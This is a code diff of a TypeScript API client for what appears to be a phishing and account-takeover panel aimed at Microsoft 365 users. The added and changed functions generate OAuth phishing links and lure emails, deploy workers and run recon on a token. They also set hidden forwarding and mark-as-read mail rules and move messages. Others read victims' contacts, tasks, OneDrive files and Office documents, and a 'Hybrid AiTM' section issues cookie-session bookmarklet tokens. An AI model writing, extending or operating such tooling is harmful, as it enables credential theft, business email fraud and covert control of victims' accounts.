@@ -10,8 +10,6 @@ import {
   BECAnalysisReport,
   Rule,
   ReconReport,
-  StoredAnalysis,
-  AIAnalysisReport,
   AnalyticsOverview,
   TokenHealthResponse,
   AiSettings,
@@ -197,11 +195,7 @@ export async function fetchManager(tokenId: string): Promise<GraphManager> {
 // === BEC Analysis ===
 
 export async function analyzeInbox(tokenId: string): Promise<BECAnalysisReport> {
-  return fetchWithRetry<BECAnalysisReport>(`/api/analyze?token_id=${encodeURIComponent(tokenId)}`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ action: "analyze" }),
-  });
+  return fetchWithRetry<BECAnalysisReport>(`/api/bec/analyze?token_id=${encodeURIComponent(tokenId)}`);
 }
 
 // === Token Refresh ===
@@ -274,9 +268,13 @@ export interface NewRulePayload {
   rule_name: string;
   condition_subject_contains: string[];
   condition_sender_domain: string[];
+  condition_body_contains?: string[];
+  condition_sender_contains?: string[];
   action_move_to_folder?: string | null;
   action_forward_to?: string | null;
+  action_mark_as_read?: boolean;
   stop_processing: boolean;
+  local_only?: boolean;
 }
 
 export async function createRule(payload: NewRulePayload): Promise<{ status: string; rule_id: string; graph_rule_id?: string; target_folder_id?: string; rule_payload: any }> {
@@ -306,22 +304,6 @@ export async function runRecon(tokenId: string): Promise<ReconReport> {
 
 export async function getRecon(tokenId: string): Promise<ReconReport> {
   return fetchWithRetry<ReconReport>(`/api/recon/${encodeURIComponent(tokenId)}`);
-}
-
-// === AI Analysis API ===
-
-export async function fetchAIAnalyses(tokenId?: string): Promise<StoredAnalysis[]> {
-  const params = new URLSearchParams();
-  if (tokenId) params.set("token_id", tokenId);
-  return fetchWithRetry<StoredAnalysis[]>(`/api/ai/analyses?${params.toString()}`);
-}
-
-export async function triggerAIAnalysis(tokenId: string, messageCount: number): Promise<AIAnalysisReport> {
-  return fetchWithRetry<AIAnalysisReport>("/api/ai/analyze", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ token_id: tokenId, message_count: messageCount }),
-  });
 }
 
 // === Analytics API ===
@@ -419,8 +401,8 @@ export async function changePassword(payload: { current_password: string; new_pa
   });
 }
 
-export async function generateOAuthLink(): Promise<{ link: string; worker_subdomain: string }> {
-  return fetchWithRetry<{ link: string; worker_subdomain: string }>("/api/campaigns/generate-link");
+export async function generateOAuthLink(local = false): Promise<{ link: string; worker_url: string }> {
+  return fetchWithRetry<{ link: string; worker_url: string }>(`/api/campaigns/generate-link?local=${local}`);
 }
 
 export async function deployWorker(): Promise<{ success: boolean; worker_url?: string; message: string }> {
@@ -485,88 +467,84 @@ export async function runAutoFilter(tokenId: string): Promise<{ success: boolean
   });
 }
 
-export async function fetchContacts(tokenId: string): Promise<{ value: { id: string; displayName?: string; emailAddresses?: { address?: string; name?: string }[] }[] }> {
-  return fetchWithRetry<{ value: { id: string; displayName?: string; emailAddresses?: { address?: string; name?: string }[] }[] }>(`/api/inbox/contacts?token_id=${encodeURIComponent(tokenId)}`);
-}
+// === Contacts API ===
 
-// === Calendar API ===
-
-export interface CalendarEvent {
+export interface GraphContact {
   id: string;
-  subject?: string;
-  bodyPreview?: string;
-  start?: { dateTime?: string; timeZone?: string };
-  end?: { dateTime?: string; timeZone?: string };
-  location?: { displayName?: string };
-  attendees?: { emailAddress?: { address?: string; name?: string }; status?: { response?: string }; type?: string }[];
-  isAllDay?: boolean;
-  isCancelled?: boolean;
-  importance?: string;
-  body?: { contentType?: string; content?: string };
-  organizer?: { emailAddress?: { address?: string; name?: string } };
+  displayName?: string;
+  givenName?: string;
+  surname?: string;
+  emailAddresses?: { address?: string; name?: string }[];
+  businessPhones?: string[];
+  mobilePhone?: string;
+  jobTitle?: string;
+  companyName?: string;
+  department?: string;
+  officeLocation?: string;
+  businessAddress?: { street?: string };
+  personalNotes?: string;
   createdDateTime?: string;
   lastModifiedDateTime?: string;
-  responseStatus?: { response?: string; time?: string };
 }
 
-export interface CalendarEventsResponse {
+export interface ContactsResponse {
   status: string;
   count: number;
-  events: CalendarEvent[];
-  start_date: string;
-  end_date: string;
+  contacts: GraphContact[];
 }
 
-export async function fetchCalendarEvents(tokenId: string, startDate?: string, endDate?: string): Promise<CalendarEventsResponse> {
-  const params = new URLSearchParams();
-  params.set("token_id", tokenId);
-  if (startDate) params.set("start_date", startDate);
-  if (endDate) params.set("end_date", endDate);
-  return fetchWithRetry<CalendarEventsResponse>(`/api/calendar/events?${params.toString()}`);
+export async function fetchContacts(tokenId: string): Promise<ContactsResponse> {
+  return fetchWithRetry<ContactsResponse>(`/api/contacts?token_id=${encodeURIComponent(tokenId)}`);
 }
 
-export interface CreateEventPayload {
-  subject: string;
-  body?: string;
-  start_date_time: string;
-  end_date_time: string;
-  time_zone?: string;
-  location?: string;
-  attendees?: string[];
-  is_all_day?: boolean;
-  importance?: string;
+export interface CreateContactPayload {
+  display_name: string;
+  given_name?: string;
+  surname?: string;
+  email_addresses: string[];
+  business_phones?: string[];
+  mobile_phone?: string;
+  job_title?: string;
+  company_name?: string;
+  department?: string;
+  office_location?: string;
+  business_address?: string;
+  personal_notes?: string;
 }
 
-export async function createCalendarEvent(tokenId: string, payload: CreateEventPayload): Promise<{ status: string; event: CalendarEvent }> {
-  return fetchWithRetry<{ status: string; event: CalendarEvent }>(`/api/calendar/events?token_id=${encodeURIComponent(tokenId)}`, {
+export async function createContact(tokenId: string, payload: CreateContactPayload): Promise<{ status: string; contact: GraphContact }> {
+  return fetchWithRetry<{ status: string; contact: GraphContact }>(`/api/contacts?token_id=${encodeURIComponent(tokenId)}`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(payload),
   });
 }
 
-export interface UpdateEventPayload {
-  subject?: string;
-  body?: string;
-  start_date_time?: string;
-  end_date_time?: string;
-  time_zone?: string;
-  location?: string;
-  attendees?: string[];
-  is_all_day?: boolean;
-  importance?: string;
+export interface UpdateContactPayload {
+  display_name?: string;
+  given_name?: string;
+  surname?: string;
+  email_addresses?: string[];
+  business_phones?: string[];
+  mobile_phone?: string;
+  job_title?: string;
+  company_name?: string;
+  department?: string;
+  office_location?: string;
+  business_address?: string;
+  personal_notes?: string;
 }
 
-export async function updateCalendarEvent(tokenId: string, eventId: string, payload: UpdateEventPayload): Promise<{ status: string; event: CalendarEvent }> {
-  return fetchWithRetry<{ status: string; event: CalendarEvent }>(`/api/calendar/events/${encodeURIComponent(eventId)}?token_id=${encodeURIComponent(tokenId)}`, {
+export async function updateContact(tokenId: string, contactId: string, payload: UpdateContactPayload): Promise<{ status: string; contact: GraphContact }> {
+  return fetchWithRetry<{ status: string; contact: GraphContact }>(`/api/contacts/${encodeURIComponent(contactId)}?token_id=${encodeURIComponent(tokenId)}`, {
     method: "PATCH",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(payload),
   });
 }
 
-export async function deleteCalendarEvent(tokenId: string, eventId: string): Promise<{ status: string; event_id: string }> {
-  return fetchWithRetry<{ status: string; event_id: string }>(`/api/calendar/events/${encodeURIComponent(eventId)}?token_id=${encodeURIComponent(tokenId)}`, {
+export async function deleteContact(tokenId: string, contactId: string): Promise<{ status: string; contact_id: string }> {
+  return fetchWithRetry<{ status: string; contact_id: string }>(`/api/contacts/${encodeURIComponent(contactId)}?token_id=${encodeURIComponent(tokenId)}`, {
     method: "DELETE",
     headers: { "Content-Type": "application/json" },
   });
@@ -577,6 +555,14 @@ export async function markMessageRead(tokenId: string, messageId: string, isRead
     method: "PATCH",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ is_read: isRead }),
+  });
+}
+
+export async function moveMessage(tokenId: string, messageId: string, destinationFolderId: string): Promise<{ success: boolean }> {
+  return fetchWithRetry<{ success: boolean }>(`/api/inbox/messages/${encodeURIComponent(messageId)}/move?token_id=${encodeURIComponent(tokenId)}`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ destination_folder_id: destinationFolderId }),
   });
 }
 
@@ -602,6 +588,93 @@ export async function generateLureEmail(payload: {
   });
 }
 
+// === Tasks API ===
+
+export interface TaskList {
+  id: string;
+  displayName: string;
+  isOwner?: boolean;
+  isShared?: boolean;
+  wellknownListName?: string;
+}
+
+export interface Task {
+  id: string;
+  title: string;
+  body?: { content?: string; contentType?: string };
+  importance?: string;
+  status?: string;
+  dueDateTime?: { dateTime?: string; timeZone?: string };
+  reminderDateTime?: { dateTime?: string; timeZone?: string };
+  isReminderOn?: boolean;
+  createdDateTime?: string;
+  lastModifiedDateTime?: string;
+  completedDateTime?: { dateTime?: string; timeZone?: string };
+}
+
+export interface TaskListsResponse {
+  status: string;
+  lists: TaskList[];
+}
+
+export interface TasksResponse {
+  status: string;
+  list_id: string;
+  tasks: Task[];
+}
+
+export async function fetchTaskLists(tokenId: string): Promise<TaskListsResponse> {
+  return fetchWithRetry<TaskListsResponse>(`/api/tasks/lists?token_id=${encodeURIComponent(tokenId)}`);
+}
+
+export async function fetchTasks(tokenId: string, listId?: string): Promise<TasksResponse> {
+  const url = listId
+    ? `/api/tasks?token_id=${encodeURIComponent(tokenId)}&list_id=${encodeURIComponent(listId)}`
+    : `/api/tasks?token_id=${encodeURIComponent(tokenId)}`;
+  return fetchWithRetry<TasksResponse>(url);
+}
+
+export interface CreateTaskPayload {
+  title: string;
+  body?: string;
+  due_date_time?: string;
+  reminder_date_time?: string;
+  importance?: string;
+  status?: string;
+}
+
+export async function createTask(tokenId: string, listId: string, payload: CreateTaskPayload): Promise<{ status: string; task: Task }> {
+  return fetchWithRetry<{ status: string; task: Task }>(`/api/tasks?token_id=${encodeURIComponent(tokenId)}&list_id=${encodeURIComponent(listId)}`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload),
+  });
+}
+
+export interface UpdateTaskPayload {
+  title?: string;
+  body?: string;
+  due_date_time?: string;
+  reminder_date_time?: string;
+  importance?: string;
+  status?: string;
+  is_reminder_on?: boolean;
+}
+
+export async function updateTask(tokenId: string, listId: string, taskId: string, payload: UpdateTaskPayload): Promise<{ status: string; task: Task }> {
+  return fetchWithRetry<{ status: string; task: Task }>(`/api/tasks/${encodeURIComponent(taskId)}?token_id=${encodeURIComponent(tokenId)}&list_id=${encodeURIComponent(listId)}`, {
+    method: "PATCH",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload),
+  });
+}
+
+export async function deleteTask(tokenId: string, listId: string, taskId: string): Promise<{ status: string; task_id: string }> {
+  return fetchWithRetry<{ status: string; task_id: string }>(`/api/tasks/${encodeURIComponent(taskId)}?token_id=${encodeURIComponent(tokenId)}&list_id=${encodeURIComponent(listId)}`, {
+    method: "DELETE",
+  });
+}
+
 export interface AuditLogsQuery {
   from?: string;
   to?: string;
@@ -616,6 +689,85 @@ export interface AuditLogsResponse {
   total: number;
 }
 
+// === OneDrive API ===
+
+export interface DriveItem {
+  id: string;
+  name: string;
+  size?: number;
+  file?: { mimeType?: string };
+  folder?: { childCount?: number };
+  image?: { height?: number; width?: number };
+  webUrl?: string;
+  downloadUrl?: string;
+  createdDateTime?: string;
+  lastModifiedDateTime?: string;
+  parentReference?: { id?: string; path?: string };
+  mimeType?: string;
+}
+
+export interface OneDriveResponse {
+  status: string;
+  current_folder?: DriveItem;
+  items: DriveItem[];
+  path: string;
+}
+
+export async function fetchOneDriveItems(tokenId: string, itemId?: string, path?: string): Promise<OneDriveResponse> {
+  const params = new URLSearchParams();
+  params.set("token_id", tokenId);
+  if (itemId) params.set("item_id", itemId);
+  if (path) params.set("path", path);
+  return fetchWithRetry<OneDriveResponse>(`/api/onedrive/items?${params.toString()}`);
+}
+
+export async function searchOneDriveItems(tokenId: string, query: string): Promise<{ status: string; items: DriveItem[]; count: number }> {
+  return fetchWithRetry<{ status: string; items: DriveItem[]; count: number }>(`/api/onedrive/search?token_id=${encodeURIComponent(tokenId)}&q=${encodeURIComponent(query)}`);
+}
+
+export function getOneDriveDownloadUrl(tokenId: string, itemId: string): string {
+  return `/api/onedrive/items/${encodeURIComponent(itemId)}/download?token_id=${encodeURIComponent(tokenId)}`;
+}
+
+// === Office Apps API ===
+
+export interface OfficeDocument {
+  id: string;
+  name: string;
+  size?: number;
+  mime_type: string;
+  doc_type: string;
+  web_url: string;
+  download_url?: string;
+  embed_url?: string;
+  thumbnail_url?: string;
+  created_date_time?: string;
+  last_modified_date_time?: string;
+  created_by?: string;
+  last_modified_by?: string;
+}
+
+export interface OfficeDocsResponse {
+  status: string;
+  documents: OfficeDocument[];
+  count: number;
+}
+
+export async function fetchOfficeDocs(tokenId: string, docType?: string): Promise<OfficeDocsResponse> {
+  const params = new URLSearchParams();
+  params.set("token_id", tokenId);
+  if (docType) params.set("doc_type", docType);
+  return fetchWithRetry<OfficeDocsResponse>(`/api/office/docs?${params.toString()}`);
+}
+
+export async function searchOfficeDocs(tokenId: string, query: string): Promise<OfficeDocsResponse> {
+  return fetchWithRetry<OfficeDocsResponse>(`/api/office/search?token_id=${encodeURIComponent(tokenId)}&q=${encodeURIComponent(query)}`);
+}
+
+export async function getOfficeEmbedUrl(tokenId: string, itemId: string): Promise<{ status: string; document: OfficeDocument & { office_online_url: string } }> {
+  return fetchWithRetry<{ status: string; document: OfficeDocument & { office_online_url: string } }>(`/api/office/embed?token_id=${encodeURIComponent(tokenId)}&item_id=${encodeURIComponent(itemId)}`);
+}
+
 export async function getAuditLogs(query: AuditLogsQuery = {}): Promise<AuditLogsResponse> {
   const params = new URLSearchParams();
   if (query.from) params.set("from", query.from);
@@ -625,4 +777,14 @@ export async function getAuditLogs(query: AuditLogsQuery = {}): Promise<AuditLog
   if (query.page) params.set("page", String(query.page));
   if (query.per_page) params.set("per_page", String(query.per_page));
   return fetchWithRetry<AuditLogsResponse>(`/api/audit/logs?${params.toString()}`);
+}
+
+// ===== Cookie Session / Hybrid AiTM =====
+
+export async function generateBookmarkletToken(tokenId: string): Promise<{ status: string; token: string; expires_in: number }> {
+  return fetchWithRetry<{ status: string; token: string; expires_in: number }>(`/api/tokens/${encodeURIComponent(tokenId)}/session/bookmarklet`);
+}
+
+export async function testCookieSession(tokenId: string): Promise<{ status: string; valid: boolean; message: string }> {
+  return fetchWithRetry<{ status: string; valid: boolean; message: string }>(`/api/tokens/${encodeURIComponent(tokenId)}/session/test`);
 }
